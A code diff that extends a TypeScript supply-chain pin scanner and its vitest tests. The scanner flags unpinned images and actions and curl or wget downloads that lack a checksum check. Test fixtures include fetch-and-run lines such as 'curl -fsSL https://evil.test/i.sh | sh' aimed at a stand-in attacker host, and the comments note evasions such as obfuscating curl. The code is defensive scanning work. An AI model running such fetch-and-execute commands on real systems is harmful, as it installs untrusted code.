@@ -3,9 +3,17 @@
 //   (Dockerfiles, YAML and shell scripts, and any local action a workflow uses) is an @sha256
 //   digest, after resolving ARG defaults and ${VAR:-default} placeholders.
 // - Every `uses:` names a full 40-hex commit SHA.
-// - Every downloaded binary in a Dockerfile has a checksum check within three lines.
+// - Every curl or wget (in a Dockerfile RUN or heredoc, a shell script or a workflow `run:`) has a
+//   real checksum check (`sha256sum -c`, `sha512sum -c`, `--checksum`) in the same command or on
+//   one of the next three lines that aren't comments. ADD of an http(s) URL needs --checksum.
 // - Every npm dependency added after the pre-M4 snapshot is an exact version.
 // The 14-day age rule is a PR checklist line, not a test.
+//
+// Limits: this is a textual scan, not a shell or Dockerfile interpreter. It can be fooled by
+// obfuscation (`cu""rl`, `eval`, a download through python, node or a script copied into the
+// image), it doesn't tie a checksum to the file that was downloaded, and it counts ADD over ssh or
+// git URLs (`git@…`) as not a download. Review and CODEOWNERS remain the control for those; a pass
+// here is a floor, not a guarantee.
 import {
   mkdirSync,
   mkdtempSync,
@@ -15,7 +23,7 @@ import {
   writeFileSync,
 } from 'node:fs';
 import { tmpdir } from 'node:os';
-import { dirname, join } from 'node:path';
+import { dirname, join, posix } from 'node:path';
 import { fileURLToPath } from 'node:url';
 import { loadAll } from 'js-yaml';
 import { describe, expect, test } from 'vitest';
@@ -27,8 +35,35 @@ const ROOT = fileURLToPath(new URL('..', import.meta.url));
 
 const IS_DIGEST = /@sha256:[0-9a-f]{64}$/;
 const IS_SHA = /@[0-9a-f]{40}$/;
-const CHECKSUM = /sha256sum\s+-c|sha512sum\s+-c|--checksum/;
+const CHECKSUM = /\bsha(256|384|512)sum\s+(-c|--check)\b|--checksum\b/;
 const HAS_URL = /https?:\/\//;
+
+/** A line without its shell comment (a `#` at the start or after whitespace). */
+const stripComment = (line: string): string => line.replace(/(^|\s)#.*$/, '');
+
+/**
+ * True when the text runs curl or wget in command position for anything but --version or --help.
+ * The URL isn't resolved: a literal or a variable both count.
+ */
+function downloads(text: string): boolean {
+  const command =
+    /(?:^|[;&|(`]\s*|\b(?:then|do|else|exec|sudo|xargs|env|time)\s+)(curl|wget)(?=\s|$)(\s+\S+)?/gi;
+  for (const m of stripComment(text).matchAll(command))
+    if (!/^\s+(--version|-V|--help|-h)$/.test(m[2] ?? '')) return true;
+  return false;
+}
+
+/** A checksum check in the text or on one of the next three lines that aren't comments. */
+function checksummed(text: string, following: string[]): boolean {
+  if (CHECKSUM.test(stripComment(text))) return true;
+  return following
+    .filter((l) => l.trim() !== '' && !l.trim().startsWith('#'))
+    .slice(0, 3)
+    .some((l) => CHECKSUM.test(stripComment(l)));
+}
+
+const DOWNLOAD_MESSAGE =
+  'curl/wget without sha256sum -c, sha512sum -c or --checksum here or on the next three lines';
 const unquote = (s: string): string => s.replace(/^['"]|['"]$/g, '');
 
 /** Splits on whitespace outside quotes and removes the quotes. */
@@ -160,18 +195,17 @@ export function scanDockerfile(
           if (kv.startsWith('from=')) checkFromRef(at.line, 'RUN --mount from', kv.slice(5));
       }
     }
-    if (op === 'ADD' && HAS_URL.test(args)) {
+    if (op === 'ADD') {
       // --checksum is a flag of this ADD; a later instruction's flag doesn't cover it.
-      if (!/(^|\s)--checksum=sha(256|384|512):/.test(args))
+      if (HAS_URL.test(args) && !/(^|\s)--checksum=sha(256|384|512):/.test(args))
         report(at.line, 'ADD of a URL without --checksum=sha256:… on the same instruction');
-    } else if (/\b(curl|wget)\b/.test(args) && HAS_URL.test(args)) {
-      const after = lines.slice(at.end, at.end + 3).join('\n');
-      if (!CHECKSUM.test(args) && !CHECKSUM.test(after))
-        report(
-          at.line,
-          'download without sha256sum -c, sha512sum -c or --checksum within three lines',
-        );
+      return;
     }
+    // RUN's shell text after its flags; any other "instruction" is a heredoc body line (or a
+    // keyword whose text isn't run at build time, which the command-position rule ignores).
+    const shell = op === 'RUN' ? args.replace(/^(?:--\S+\s+)*/, '') : `${op.toLowerCase()} ${args}`;
+    if (downloads(shell) && !checksummed(shell, lines.slice(at.end)))
+      report(at.line, DOWNLOAD_MESSAGE);
   };
   // Every instruction, continuation lines joined; heredoc bodies are checked as instructions too.
   for (const ins of instructions(text)) check(ins.op, ins.args, ins);
@@ -192,9 +226,18 @@ function yamlImage(key: string, raw: string): string | undefined {
   return IS_DIGEST.test(ref) ? undefined : `${key}: ${raw} is not an @sha256 digest`;
 }
 
-type YamlRef = { key: 'uses' | 'image' | 'container'; value: string; path: string[]; line: number };
+type YamlRef = {
+  key: 'uses' | 'image' | 'container' | 'run';
+  value: string;
+  path: string[];
+  line: number;
+};
 
-/** Every uses:, image: and container: string in a YAML file, block or flow style, with lines. */
+/**
+ * Every uses:, image:, container: and run: string in a YAML file, block or flow style, with lines.
+ * A run: block's line is the line its first line of text would have, so that line n of the block
+ * is at `line + n - 1`.
+ */
 function yamlRefs(text: string): YamlRef[] | { error: string; line: number } {
   let docs: unknown[];
   try {
@@ -220,6 +263,19 @@ function yamlRefs(text: string): YamlRef[] | { error: string; line: number } {
     }
     return 0;
   };
+  let runCursor = 0;
+  const runLineOf = (value: string): number => {
+    const parts = value.split('\n');
+    const first = parts.findIndex((p) => p.trim() !== '');
+    if (first < 0) return 0;
+    const needle = (parts[first] as string).trim();
+    for (let i = runCursor; i < lines.length; i++) {
+      if (!(lines[i] as string).includes(needle)) continue;
+      runCursor = i + 1;
+      return i + 1 - first;
+    }
+    return 0;
+  };
   const out: YamlRef[] = [];
   const visit = (node: unknown, path: string[]) => {
     if (Array.isArray(node)) return node.forEach((n, i) => visit(n, [...path, String(i)]));
@@ -227,6 +283,8 @@ function yamlRefs(text: string): YamlRef[] | { error: string; line: number } {
     for (const [key, value] of Object.entries(node)) {
       if ((key === 'uses' || key === 'image' || key === 'container') && typeof value === 'string')
         out.push({ key, value, path: [...path, key], line: lineOf(value) });
+      else if (key === 'run' && typeof value === 'string')
+        out.push({ key, value, path: [...path, key], line: runLineOf(value) });
       else visit(value, [...path, key]);
     }
   };
@@ -234,23 +292,44 @@ function yamlRefs(text: string): YamlRef[] | { error: string; line: number } {
   return out.sort((a, b) => a.line - b.line);
 }
 
+const isActionFile = (file: string): boolean => /(^|\/)action\.ya?ml$/.test(file);
+
 export function scanYaml(file: string, text: string): Finding[] {
   const refs = yamlRefs(text);
   if (!Array.isArray(refs)) return [{ file, line: refs.line, message: refs.error }];
   const findings: Finding[] = [];
   for (const { key, value, path, line } of refs) {
     let message: string | undefined;
+    if (key === 'run') {
+      for (const f of scanShell(file, value)) findings.push({ ...f, line: f.line + line - 1 });
+      continue;
+    }
     if (key === 'uses') {
       if (value.startsWith('./')) continue; // scanned through its action file by scanRepo
       if (value.startsWith('docker://'))
         message = IS_DIGEST.test(value) ? undefined : `uses: ${value} is not an @sha256 digest`;
       else if (!IS_SHA.test(value)) message = `uses: ${value} is not a full 40-hex commit SHA`;
-    } else if (key === 'image' && path.at(-2) === 'runs' && !value.startsWith('docker://')) {
-      continue; // a Docker action's own Dockerfile, scanned as a Dockerfile
+    } else if (isActionImage(file, path) && !value.startsWith('docker://')) {
+      continue; // a Docker action's own Dockerfile: scanRepo scans that file
     } else message = yamlImage(key, value);
     if (message) findings.push({ file, line, message });
   }
-  return findings;
+  return findings.sort((a, b) => a.line - b.line);
+}
+
+/** `runs.image` of an action file. */
+const isActionImage = (file: string, path: string[]): boolean =>
+  isActionFile(file) && path.length === 2 && path[0] === 'runs' && path[1] === 'image';
+
+/** The local Dockerfile a Docker action builds (`runs.image` that isn't docker://), if any. */
+export function actionDockerfile(
+  file: string,
+  text: string,
+): { path: string; line: number } | undefined {
+  const refs = yamlRefs(text);
+  if (!Array.isArray(refs)) return undefined;
+  const ref = refs.find((r) => isActionImage(file, r.path) && !r.value.startsWith('docker://'));
+  return ref ? { path: ref.value, line: ref.line } : undefined;
 }
 
 /** The `uses: ./…` local action references in a YAML file, with lines. */
@@ -339,27 +418,71 @@ function commandText(s: string): string {
   return s;
 }
 
-/** Shell lines with backslash continuations joined, each with its first line number. */
-function shellLines(text: string): { text: string; line: number }[] {
-  const out: { text: string; line: number }[] = [];
+/** Shell lines with backslash continuations joined, each with its first and last line number. */
+function shellLines(text: string): { text: string; line: number; end: number }[] {
+  const out: { text: string; line: number; end: number }[] = [];
   let pending = '';
   let start = 0;
   text.split('\n').forEach((raw, i) => {
     if (pending === '') start = i + 1;
     pending += (pending ? ' ' : '') + raw.replace(/\\$/, '');
     if (raw.endsWith('\\')) return;
-    out.push({ text: pending, line: start });
+    out.push({ text: pending, line: start, end: i + 1 });
     pending = '';
   });
-  if (pending) out.push({ text: pending, line: start });
+  if (pending) out.push({ text: pending, line: start, end: text.split('\n').length });
+  return out;
+}
+
+/** docker global options that take no value. */
+const DOCKER_GLOBAL_BOOLEANS = new Set(['-D', '--debug', '--tls', '--tlsverify']);
+
+type DockerCommand = { sub: 'run' | 'create' | 'pull' | 'build'; args: string[] };
+
+/**
+ * The docker commands in one shell line: `docker [global options] run|create|pull|build`, the
+ * `container run|create`, `image pull|build`, `builder build` and `buildx build` forms, and the same
+ * through a variable that holds docker (`D=docker; $D run …`).
+ */
+function dockerCommands(line: string, isDocker: (word: string) => boolean): DockerCommand[] {
+  const out: DockerCommand[] = [];
+  const starts = /(?:^|[\s;&|(`])("?(?:docker|\$\{?[A-Za-z_]\w*\}?)"?)(?=\s)/g;
+  for (const m of line.matchAll(starts)) {
+    if (!isDocker(unquote(m[1] as string))) continue;
+    const tokens = words(commandText(line.slice((m.index ?? 0) + m[0].length)));
+    let i = 0;
+    while (i < tokens.length && (tokens[i] as string).startsWith('-')) {
+      const t = tokens[i] as string;
+      i += t.includes('=') || DOCKER_GLOBAL_BOOLEANS.has(t) ? 1 : 2;
+    }
+    let sub = tokens[i];
+    const group = {
+      container: ['run', 'create'],
+      image: ['pull', 'build'],
+      builder: ['build'],
+      buildx: ['build'],
+    }[sub ?? ''] as string[] | undefined;
+    if (group) {
+      sub = tokens[i + 1];
+      if (!sub || !group.includes(sub)) continue;
+      i++;
+    }
+    if (sub === 'run' || sub === 'create' || sub === 'pull' || sub === 'build')
+      out.push({ sub, args: tokens.slice(i + 1) });
+  }
   return out;
 }
 
 /**
- * Image references in a shell script: the image argument of `docker run|create|pull` and every
- * JSON `"image":"…"` field. Each must be an @sha256 digest, an image the script builds itself
- * (`docker build -t`), or one listed for the file in LOCAL_IMAGE_FILES. `$VAR` resolves through
- * the script's first `VAR=` assignment (and a `${X:-default}` there to its default).
+ * Image references and downloads in a shell script (or a workflow `run:` block):
+ * - the image argument of docker run/create/pull, in every form `dockerCommands` knows;
+ * - every JSON `"image":"…"` field;
+ * - `--build-arg BASE=…` and `--build-arg *_IMAGE=…` values of docker build;
+ * - an inline Dockerfile (`docker build … - <<EOF` or `-f-`), scanned as a Dockerfile;
+ * - curl and wget, which need a checksum check nearby.
+ * An image must be an @sha256 digest, an image the script builds itself (`docker build -t`), or one
+ * listed for the file in LOCAL_IMAGE_FILES. `$VAR` resolves through the variable's last assignment
+ * before the line (and a `${X:-default}` there to its default).
  */
 export function scanShell(
   file: string,
@@ -367,20 +490,18 @@ export function scanShell(
   local: typeof LOCAL_IMAGE_FILES = LOCAL_IMAGE_FILES,
 ): Finding[] {
   const findings: Finding[] = [];
+  const raw = text.split('\n');
   const logical = shellLines(text);
   const vars = new Map<string, string>();
   const allowed = new Set(local[file]?.images ?? []);
-  for (const { text: l } of logical) {
-    const m = /^\s*(?:export\s+|readonly\s+)?([A-Za-z_]\w*)=(\S*)/.exec(l);
-    if (m && !vars.has(m[1] as string)) vars.set(m[1] as string, unquote(m[2] as string));
-    for (const b of l.matchAll(/\bdocker\s+(?:buildx\s+)?build\b/g)) {
-      const w = words(commandText(l.slice((b.index ?? 0) + b[0].length)));
-      w.forEach((t, i) => {
-        if ((t === '-t' || t === '--tag') && w[i + 1]) allowed.add(w[i + 1] as string);
-        else if (t.startsWith('--tag=')) allowed.add(t.slice(6));
-      });
-    }
-  }
+  // Tags the script builds, wherever they appear.
+  for (const { text: l } of logical)
+    for (const c of dockerCommands(stripComment(l), (w) => w === 'docker' || w.endsWith('/docker')))
+      if (c.sub === 'build')
+        c.args.forEach((t, i) => {
+          if ((t === '-t' || t === '--tag') && c.args[i + 1]) allowed.add(c.args[i + 1] as string);
+          else if (t.startsWith('--tag=')) allowed.add(t.slice(6));
+        });
   const resolve = (ref: string): Resolved => {
     let error: string | undefined;
     const value = ref.replace(/\$\{([A-Za-z_]\w*)\}|\$([A-Za-z_]\w*)/g, (_m, a, b) => {
@@ -395,24 +516,62 @@ export function scanShell(
     if (!error && value.includes('$')) error = `${ref} can't be resolved`;
     return error ? { error } : { value };
   };
-  const check = (line: number, what: string, ref: string) => {
+  const isDocker = (word: string) => {
+    const r = word.startsWith('$') ? resolve(word) : { value: word };
+    return 'value' in r && (r.value === 'docker' || r.value.endsWith('/docker'));
+  };
+  const check = (line: number, what: string, ref: string, localOk = true) => {
     const r = resolve(ref);
     if ('error' in r) return findings.push({ file, line, message: `${what} ${ref}: ${r.error}` });
-    if (!IS_DIGEST.test(r.value) && !allowed.has(r.value))
+    if (!IS_DIGEST.test(r.value) && !(localOk && allowed.has(r.value)))
       findings.push({
         file,
         line,
         message: `${what} ${ref} (${r.value}) is not an @sha256 digest`,
       });
   };
-  for (const { text: l, line } of logical) {
-    for (const m of l.matchAll(/\bdocker\s+(run|create|pull)\b/g)) {
-      const sub = m[1] as string;
-      const bools = BOOLEAN_FLAGS[sub] as Set<string>;
-      const tokens = words(commandText(l.slice((m.index ?? 0) + m[0].length)));
+  let skipThrough = 0; // the last line of an inline Dockerfile already scanned
+  for (const { text: full, line, end } of logical) {
+    if (line <= skipThrough) continue;
+    const l = stripComment(full);
+    if (l.trim() === '') continue;
+    for (const c of dockerCommands(l, isDocker)) {
+      if (c.sub === 'build') {
+        c.args.forEach((t, i) => {
+          const arg =
+            t === '--build-arg'
+              ? c.args[i + 1]
+              : t.startsWith('--build-arg=')
+                ? t.slice(12)
+                : undefined;
+          const eq = arg?.indexOf('=') ?? -1;
+          if (!arg || eq < 0) return;
+          const name = arg.slice(0, eq);
+          if (name === 'BASE' || name.endsWith('_IMAGE'))
+            check(line, `--build-arg ${name}=`, arg.slice(eq + 1), false);
+        });
+        const heredoc = /<<-?\s*['"]?([A-Za-z_]\w*)['"]?/.exec(l);
+        const stdin = c.args.some(
+          (t, i) =>
+            t === '-' ||
+            t === '-f-' ||
+            t === '--file=-' ||
+            ((t === '-f' || t === '--file') && c.args[i + 1] === '-'),
+        );
+        if (heredoc && stdin) {
+          const close = raw.findIndex((r, i) => i >= end && r.trim() === heredoc[1]);
+          const bodyEnd = close < 0 ? raw.length : close;
+          const body = raw.slice(end, bodyEnd).join('\n');
+          for (const f of scanDockerfile(file, body, {}))
+            findings.push({ ...f, line: f.line + end });
+          skipThrough = bodyEnd + 1;
+        }
+        continue;
+      }
+      const bools = BOOLEAN_FLAGS[c.sub] as Set<string>;
       let image: string | undefined;
-      for (let i = 0; i < tokens.length; i++) {
-        const t = tokens[i] as string;
+      for (let i = 0; i < c.args.length; i++) {
+        const t = c.args[i] as string;
         if (/^\$\{\w+\[@\]\}$/.test(t)) continue; // an array of options
         if (t.startsWith('-')) {
           if (!t.includes('=') && !bools.has(t)) i++;
@@ -422,20 +581,22 @@ export function scanShell(
         break;
       }
       if (image === undefined)
-        findings.push({ file, line, message: `docker ${sub}: no image found` });
-      else check(line, `docker ${sub}`, image);
+        findings.push({ file, line, message: `docker ${c.sub}: no image found` });
+      else check(line, `docker ${c.sub}`, image);
     }
+    for (const m of l.matchAll(/"image"\s*:\s*"([^"]+)"/g)) check(line, '"image":', m[1] as string);
+    if (downloads(l) && !checksummed(l, raw.slice(end)))
+      findings.push({ file, line, message: DOWNLOAD_MESSAGE });
+    // The assignment takes effect after this line, so a use sees the last assignment before it.
+    const assign = /^\s*(?:export\s+|readonly\s+|local\s+)?([A-Za-z_]\w*)=(.*)$/.exec(l);
+    if (assign) vars.set(assign[1] as string, words(assign[2] as string)[0] ?? '');
   }
-  text.split('\n').forEach((raw, i) => {
-    for (const m of raw.matchAll(/"image"\s*:\s*"([^"]+)"/g))
-      check(i + 1, '"image":', m[1] as string);
-  });
   return findings.sort((a, b) => a.line - b.line);
 }
 
 const isDockerfile = (path: string): boolean => {
   const base = path.slice(path.lastIndexOf('/') + 1);
-  return base === 'Dockerfile' || base.startsWith('Dockerfile.') || base.endsWith('.Dockerfile');
+  return /^(Dockerfile|Containerfile)(\..+)?$/.test(base) || base.endsWith('.Dockerfile');
 };
 
 /** The roots the image and action scan walks. */
@@ -459,6 +620,16 @@ export function scanRepo(root: string): Finding[] {
     else if (file.endsWith('.sh')) findings.push(...scanShell(file, text));
     else if (/\.ya?ml$/.test(file)) {
       findings.push(...scanYaml(file, text));
+      const own = actionDockerfile(file, text);
+      if (own) {
+        const target = posix.normalize(posix.join(posix.dirname(file), own.path));
+        if (!exists(target))
+          findings.push({ file, line: own.line, message: `runs.image ${own.path} does not exist` });
+        else if (!scanned.has(target)) {
+          scanned.add(target);
+          findings.push(...scanDockerfile(target, readFileSync(join(root, target), 'utf8')));
+        }
+      }
       // A local action is scanned wherever it lives, with everything in its directory.
       for (const { target, line } of localUses(text)) {
         const action = [`${target}/action.yml`, `${target}/action.yaml`].find(exists);
@@ -863,5 +1034,128 @@ describe('pin scan: review bypasses', () => {
     expect(
       lines(scanShell('images/trooper/e2e/run.sh', run.replace(/@sha256:[0-9a-f]{64}/g, ''))),
     ).not.toEqual([]);
+  });
+});
+
+// Crafted inputs from the re-review. Each one passed the scan at fa71135.
+describe('pin scan: re-review', () => {
+  const F = 'images/x/Dockerfile';
+  const S = 'images/x/run.sh';
+  const W = '.github/workflows/x.yml';
+  const HEX = 'f'.repeat(64);
+  const D64 = `@sha256:${'a'.repeat(64)}`;
+  const lines = (findings: Finding[]) => findings.map((f) => f.line);
+
+  test('R1: a curl or wget in a heredoc, or with a variable URL, needs a checksum', () => {
+    const cases: [string, number[]][] = [
+      [`FROM ${DIGEST}\nRUN <<EOF\ncurl -fsSLo /x https://evil.test/bin\nEOF`, [3]],
+      [`FROM ${DIGEST}\nRUN <<EOF\nwget -qO /x https://evil.test/bin\nEOF`, [3]],
+      [`FROM ${DIGEST}\nARG URL=https://evil.test/bin\nRUN curl -fsSLo /x "$URL"`, [3]],
+      [`FROM ${DIGEST}\nENV URL=https://evil.test/bin\nRUN wget -qO /x $URL`, [3]],
+      // A comment is not a checksum, on its own line or after the command.
+      [`FROM ${DIGEST}\nRUN curl -fsSLo /x https://e.test/x\n# sha256sum -c is done later`, [2]],
+      [`FROM ${DIGEST}\nRUN curl -fsSLo /x https://e.test/x # sha256sum -c later`, [2]],
+      // A real checksum next to it passes, in a heredoc too.
+      [
+        `FROM ${DIGEST}\nRUN <<EOF\ncurl -fsSLo /x https://e.test/x\necho "${HEX}  /x" | sha256sum -c -\nEOF`,
+        [],
+      ],
+      [`FROM ${DIGEST}\nRUN curl --version && wget --help`, []],
+    ];
+    for (const [text, want] of cases) expect(lines(scanDockerfile(F, text)), text).toEqual(want);
+  });
+
+  test('shell scripts: downloads need a checksum on a nearby non-comment line', () => {
+    const cases: [string, number[]][] = [
+      ['curl -fsSL https://evil.test/i.sh | sh', [1]],
+      ['URL=https://e.test/x\ncurl -fsSLo /x "$URL"\nchmod +x /x', [2]],
+      ['curl -fsSLo /x https://e.test/x\n# sha256sum -c later', [1]],
+      [`curl -fsSLo /x "$URL"\necho "${HEX}  /x" | sha256sum -c -`, []],
+      [`wget -qO /x https://e.test/x && sha256sum --check x.sha256`, []],
+    ];
+    for (const [text, want] of cases) expect(lines(scanShell(S, text)), text).toEqual(want);
+  });
+
+  test('shell scripts: --build-arg BASE= and *_IMAGE= values need digests', () => {
+    const text = [
+      'docker build --build-arg BASE=node:24 -t a .',
+      'docker build --build-arg TOOL_IMAGE=ghcr.io/o/t:1 -t b .',
+      `docker build --build-arg=BASE=node${D64} -t c .`,
+      'docker build --build-arg SOURCE_URL=https://x -t d .',
+      'B=node:24',
+      'docker buildx build --build-arg "BASE=$B" -t e .',
+    ].join('\n');
+    expect(lines(scanShell(S, text))).toEqual([1, 2, 6]);
+  });
+
+  test('shell scripts: other docker command forms are recognised', () => {
+    const text = [
+      'docker --context x run alpine:3',
+      'docker container run --rm alpine:3 true',
+      'docker image pull alpine:3',
+      'D=docker',
+      '$D run alpine:3',
+      'docker -H tcp://h:2375 container create alpine:3',
+      `docker container run --rm alpine${D64} true`,
+      'docker container ls; docker image ls',
+    ].join('\n');
+    expect(lines(scanShell(S, text))).toEqual([1, 2, 3, 5, 6]);
+  });
+
+  test('shell scripts: a variable resolves to its last assignment before the use', () => {
+    expect(lines(scanShell(S, `IMG=alpine${D64}\nIMG=alpine:3\ndocker run "$IMG"`))).toEqual([3]);
+    expect(lines(scanShell(S, `IMG=alpine:3\nIMG=alpine${D64}\ndocker run "$IMG"`))).toEqual([]);
+  });
+
+  test('shell scripts: an inline docker build - <<EOF Dockerfile is scanned as a Dockerfile', () => {
+    const text = [
+      'docker build -t x - <<EOF',
+      'FROM alpine:3',
+      'RUN curl -fsSLo /x https://evil.test/x',
+      'EOF',
+      "docker build -t y -f- . <<'DOCKERFILE'",
+      `FROM alpine${D64}`,
+      'DOCKERFILE',
+    ].join('\n');
+    expect(scanShell(S, text)).toEqual([
+      { file: S, line: 2, message: expect.stringMatching(/FROM.*digest/) },
+      { file: S, line: 3, message: expect.stringMatching(/checksum/) },
+    ]);
+  });
+
+  test('workflow run: blocks are scanned as shell', () => {
+    const text = [
+      'jobs:',
+      '  a:',
+      '    steps:',
+      '      - run: docker run alpine:3 true',
+      '      - run: |',
+      '          echo hello',
+      '          curl -fsSL https://evil.test/i.sh | sh',
+      '      - run: docker build --build-arg BASE=node:24 -t x .',
+      `      - run: docker run --rm alpine${D64} true`,
+    ].join('\n');
+    expect(lines(scanYaml(W, text))).toEqual([4, 7, 8]);
+  });
+
+  test('runs.image is skipped only in action files, and the named Dockerfile is scanned', () => {
+    const compose = 'services:\n  runs:\n    image: alpine:3\n';
+    expect(lines(scanYaml('deploy/compose.yml', compose))).toEqual([3]);
+    const root = mkdtempSync(join(tmpdir(), 'jm-pins-'));
+    const put = (file: string, text: string) => {
+      mkdirSync(dirname(join(root, file)), { recursive: true });
+      writeFileSync(join(root, file), text);
+    };
+    put('package.json', '{"workspaces":[]}');
+    put('scripts/fixtures/pre-m4-deps.json', '{}');
+    put('.github/actions/c/action.yml', 'runs:\n  using: docker\n  image: Containerfile\n');
+    put('.github/actions/c/Containerfile', 'FROM alpine:3\n');
+    put('.github/actions/m/action.yml', 'runs:\n  using: docker\n  image: missing.Dockerfile\n');
+    put('.github/actions/p/action.yaml', `runs:\n  using: docker\n  image: docker://alpine:3\n`);
+    expect(scanRepo(root).map((f) => `${f.file}:${f.line}`)).toEqual([
+      '.github/actions/c/Containerfile:1',
+      '.github/actions/m/action.yml:3',
+      '.github/actions/p/action.yaml:3',
+    ]);
   });
 });
